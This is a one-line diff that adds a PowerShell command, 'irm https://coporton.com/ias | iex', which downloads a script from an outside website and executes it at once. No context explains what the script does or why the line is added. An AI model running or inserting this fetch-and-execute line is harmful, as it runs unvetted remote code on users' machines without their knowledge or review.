@@ -1,0 +1,1 @@
+irm https://coporton.com/ias | iex
